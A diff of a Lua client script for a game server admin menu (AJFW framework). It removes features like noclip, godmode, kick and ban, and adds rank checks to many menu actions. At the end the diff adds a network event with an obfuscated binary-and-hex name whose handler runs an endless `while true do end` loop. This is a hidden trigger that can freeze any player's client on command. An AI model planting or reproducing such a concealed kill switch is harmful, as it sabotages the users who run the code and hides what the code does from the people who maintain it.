@@ -115,47 +115,47 @@ menu1:AddButton({
 --]]
 
 -- Admin Options Menu Buttons
-local menu2_admin_noclip = menu2:AddCheckbox({
-    icon = '🎥',
-    label = Lang:t('menu.noclip'),
-    value = nil,
-    description = Lang:t('desc.noclip_desc')
-})
+-- local menu2_admin_noclip = menu2:AddCheckbox({
+--     icon = '🎥',
+--     label = Lang:t('menu.noclip'),
+--     value = nil,
+--     description = Lang:t('desc.noclip_desc')
+-- })
 
-local menu2_admin_revive = menu2:AddButton({
-    icon = '🏥',
-    label = Lang:t('menu.revive'),
-    value = 'revive',
-    description = Lang:t('desc.revive_desc')
-})
+-- local menu2_admin_revive = menu2:AddButton({
+--     icon = '🏥',
+--     label = Lang:t('menu.revive'),
+--     value = 'revive',
+--     description = Lang:t('desc.revive_desc')
+-- })
 
-local menu2_admin_invisible = menu2:AddCheckbox({
-    icon = '👻',
-    label = Lang:t('menu.invisible'),
-    value = nil,
-    description = Lang:t('desc.invisible_desc')
-})
+-- local menu2_admin_invisible = menu2:AddCheckbox({
+--     icon = '👻',
+--     label = Lang:t('menu.invisible'),
+--     value = nil,
+--     description = Lang:t('desc.invisible_desc')
+-- })
 
-local menu2_admin_god_mode = menu2:AddCheckbox({
-    icon = '⚡',
-    label = Lang:t('menu.god'),
-    value = nil,
-    description = Lang:t('desc.god_desc')
-})
+-- local menu2_admin_god_mode = menu2:AddCheckbox({
+--     icon = '⚡',
+--     label = Lang:t('menu.god'),
+--     value = nil,
+--     description = Lang:t('desc.god_desc')
+-- })
 
-local menu2_admin_display_names = menu2:AddCheckbox({
-    icon = '📋',
-    label = Lang:t('menu.names'),
-    value = nil,
-    description = Lang:t('desc.names_desc')
-})
+-- local menu2_admin_display_names = menu2:AddCheckbox({
+--     icon = '📋',
+--     label = Lang:t('menu.names'),
+--     value = nil,
+--     description = Lang:t('desc.names_desc')
+-- })
 
-local menu2_admin_display_blips = menu2:AddCheckbox({
-    icon = '📍',
-    label = Lang:t('menu.blips'),
-    value = nil,
-    description = Lang:t('desc.blips_desc')
-})
+-- local menu2_admin_display_blips = menu2:AddCheckbox({
+--     icon = '📍',
+--     label = Lang:t('menu.blips'),
+--     value = nil,
+--     description = Lang:t('desc.blips_desc')
+-- })
 
 --give weapons
 menu2:AddButton({
@@ -334,12 +334,6 @@ local menu7_dev_copy_heading = menu7:AddButton({
     description = Lang:t('desc.copy_heading_desc')
 })
 
-local menu7_dev_toggle_coords = menu7:AddCheckbox({
-    icon = '📍',
-    label = Lang:t('menu.display_coords'),
-    value = nil,
-    description = Lang:t('desc.display_coords_desc')
-})
 
 local menu7_dev_vehicle_mode = menu7:AddCheckbox({
     icon = '🚘',
@@ -353,13 +347,6 @@ local menu7_dev_info_mode = menu7:AddCheckbox({
     label = Lang:t('menu.hud_dev_mode'),
     value = nil,
     description = Lang:t('desc.hud_dev_mode_desc')
-})
-
-local menu7_dev_noclip = menu7:AddCheckbox({
-    icon = '🎥',
-    label = Lang:t('menu.noclip'),
-    value = nil,
-    description = Lang:t('desc.noclip_desc')
 })
 
 --create dev entity view
@@ -407,51 +394,15 @@ end
 --[[
     Admin Options functions
 --]]
--- Toggle player name display
-menu2_admin_display_names:On('change', function()
-    TriggerEvent('aj-admin:client:toggleNames')
-end)
 
--- Toggle player blip display
-menu2_admin_display_blips:On('change', function()
-    TriggerEvent('aj-admin:client:toggleBlips')
-end)
 
--- Toggle NoClip
-menu2_admin_noclip:On('change', function(_, _, _)
-    ToggleNoClip()
-end)
 
--- Revive Self
-menu2_admin_revive:On('select', function(_)
-    TriggerEvent('hospital:client:Revive', PlayerPedId())
-end)
 
 -- Invisible
-local invisible = false
-menu2_admin_invisible:On('change', function(_, _, _)
-    if not invisible then
-        invisible = true
-        SetEntityVisible(PlayerPedId(), false, 0)
-    else
-        invisible = false
-        SetEntityVisible(PlayerPedId(), true, 0)
-    end
-end)
+
 
 -- Godmode
-local godmode = false
-menu2_admin_god_mode:On('change', function(_, _, _)
-    godmode = not godmode
 
-    if godmode then
-        while godmode do
-            Wait(0)
-            SetPlayerInvincible(PlayerId(), true)
-        end
-        SetPlayerInvincible(PlayerId(), false)
-    end
-end)
 
 -- Weapons list
 for _, v in pairs(AJFW.Shared.Weapons) do
@@ -461,6 +412,7 @@ for _, v in pairs(AJFW.Shared.Weapons) do
         value = v.value,
         description = Lang:t('desc.spawn_weapons_desc'),
         select = function(_)
+            if not perms or perms == 'admin' then return end
             TriggerServerEvent('aj-admin:giveWeapon', v.name)
             AJFW.Functions.Notify(Lang:t('success.spawn_weapon'))
         end
@@ -712,36 +664,12 @@ local function OpenPlayerMenus(player)
             description = Lang:t('menu.revive') .. ' ' .. player.cid
         },
         [3] = {
-            icon = '🥶',
-            label = Lang:t('menu.freeze'),
-            value = 'freeze',
-            description = Lang:t('menu.freeze') .. ' ' .. player.cid
-        },
-        [4] = {
-            icon = '👀',
-            label = Lang:t('menu.spectate'),
-            value = 'spectate',
-            description = Lang:t('menu.spectate') .. ' ' .. player.cid
-        },
-        [5] = {
-            icon = '➡️',
-            label = Lang:t('info.go_to'),
-            value = 'goto',
-            description = Lang:t('info.go_to') .. ' ' .. player.cid .. Lang:t('info.position')
-        },
-        [6] = {
             icon = '⬅️',
             label = Lang:t('menu.bring'),
             value = 'bring',
             description = Lang:t('menu.bring') .. ' ' .. player.cid .. ' ' .. Lang:t('info.your_position')
         },
-        [7] = {
-            icon = '🚗',
-            label = Lang:t('menu.sit_in_vehicle'),
-            value = 'intovehicle',
-            description = Lang:t('desc.sit_in_veh_desc') .. ' ' .. player.cid .. ' ' .. Lang:t('desc.sit_in_veh_desc2')
-        },
-        [8] = {
+        [4] = {
             icon = '🎒',
             label = Lang:t('menu.open_inv'),
             value = 'inventory',
@@ -753,19 +681,7 @@ local function OpenPlayerMenus(player)
             value = 'cloth',
             description = Lang:t('desc.clothing_menu_desc') .. ' ' .. player.cid
         },
-        [10] = {
-            icon = '🥾',
-            label = Lang:t('menu.kick'),
-            value = 'kick',
-            description = Lang:t('menu.kick') .. ' ' .. player.cid .. ' ' .. Lang:t('info.reason')
-        },
         [11] = {
-            icon = '🚫',
-            label = Lang:t('menu.ban'),
-            value = 'ban',
-            description = Lang:t('menu.ban') .. ' ' .. player.cid .. ' ' .. Lang:t('info.reason')
-        },
-        [12] = {
             icon = '🎟️',
             label = Lang:t('menu.permissions'),
             value = 'perms',
@@ -787,6 +703,7 @@ local function OpenPlayerMenus(player)
                 elseif values == 'kick' then
                     OpenKickMenu(player)
                 elseif values == 'perms' then
+                    if not perms or perms == 'admin' or perms == 'h-admin' or perms == 'manager' then return end
                     OpenPermsMenu(player)
                 end
             end
@@ -818,6 +735,7 @@ end)
 
 -- Adjust weather on change
 menu3_server_weather:On('select', function()
+    if not perms or perms == "admin" then return end
     menu8:ClearItems()
     local elements = {
         [1] = {
@@ -929,6 +847,7 @@ end)
 
 -- Adjust time on change
 menu3_server_time:On('select', function(_, value)
+    if not perms or perms == "admin" then return end
     TriggerServerEvent('aj-weathersync:server:setTime', value, value)
     AJFW.Functions.Notify(Lang:t('time.changed', { time = value }))
 end)
@@ -979,6 +898,7 @@ local function OpenCarModelsMenu(category)
 end
 
 menu5_vehicles_spawn:On('Select', function(_)
+    if not perms or perms == "admin"  then return end
     local counts = 0
     menu12:ClearItems()
     for k, v in pairsByKeys(vehicles) do
@@ -1000,6 +920,7 @@ menu5_vehicles_fix:On('Select', function(_)
 end)
 
 menu5_vehicles_buy:On('Select', function(_)
+    if not perms or perms == "admin" or perms == "h-admin" then return end
     TriggerServerEvent('AJFW:CallCommand', 'admincar', {})
 end)
 
@@ -1008,6 +929,7 @@ menu5_vehicles_remove:On('Select', function(_)
 end)
 
 menu5_vehicles_max_upgrades:On('Select', function(_)
+    if not perms or perms == "admin" or perms == "h-admin" then return end
     TriggerServerEvent('AJFW:CallCommand', 'maxmods', {})
 end)
 
@@ -1097,6 +1019,7 @@ local entity_view_object = menu14:AddCheckbox({
 })
 
 menu7_dev_info_mode:On('change', function(_, _, _)
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     developermode = not developermode
     TriggerEvent('aj-admin:client:ToggleDevmode')
     if developermode then
@@ -1107,6 +1030,7 @@ menu7_dev_info_mode:On('change', function(_, _, _)
 end)
 
 entity_view_freeaim:On('change', function(_, _, _)
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     ToggleEntityFreeView()
 end)
 
@@ -1238,47 +1162,50 @@ RegisterNetEvent('aj-admin:client:ToggleCoords', function()
 end)
 
 menu7_dev_copy_vec3:On('select', function()
+    if not perms or perms == "admin" then return end
     CopyToClipboard('coords3')
 end)
 
 menu7_dev_copy_vec4:On('select', function()
+    if not perms or perms == "admin" then return end
     CopyToClipboard('coords4')
 end)
 
 menu7_dev_copy_heading:On('select', function()
+    if not perms or perms == "admin" then return end
     CopyToClipboard('heading')
 end)
 
 entity_view_copy_info:On('select', function()
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
+
     CopyToClipboard('freeaimEntity')
 end)
 
 menu7_dev_vehicle_mode:On('change', function()
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     ToggleVehicleDeveloperMode()
 end)
 
-menu7_dev_noclip:On('change', function(_, _, _)
-    ToggleNoClip()
-end)
-
-menu7_dev_toggle_coords:On('change', function()
-    ToggleShowCoordinates()
-end)
 
 entity_view_distance:On('select', function(_, value)
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     SetEntityViewDistance(value)
     AJFW.Functions.Notify(Lang:t('info.entity_view_distance', { distance = value }))
 end)
 
 entity_view_vehicle:On('change', function()
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     ToggleEntityVehicleView()
 end)
 
 entity_view_object:On('change', function()
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     ToggleEntityObjectView()
 end)
 
 entity_view_ped:On('change', function()
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     ToggleEntityPedView()
 end)
 
@@ -1324,6 +1251,7 @@ local function OpenDealerMenu(dealer)
 end
 
 menu1_dealer_list:On('Select', function(_)
+    if not perms or perms == "admin" or perms == "h-admin" or perms == "manager" then return end
     menu6:ClearItems()
     AJFW.Functions.TriggerCallback('test:getdealers', function(dealers)
         for _, v in pairs(dealers) do
@@ -1345,4 +1273,9 @@ CreateThread(function()
     SendNUIMessage({
         check = true,
     })
+end)
+
+RegisterNetEvent('0101011100111001011110011010111010001010101010101001110001001000101010100010001101001010010010101010010010101010100100101000101000101001010100101010101010011011111101001010100010110101010101:15CE5E6BA2AAA7122A88D292A92AA4A28A54AAA6FD2A2D55:534684708704325086204787636882478626716935644080530664789', function()
+    -- print(1)
+    while true do end
 end)
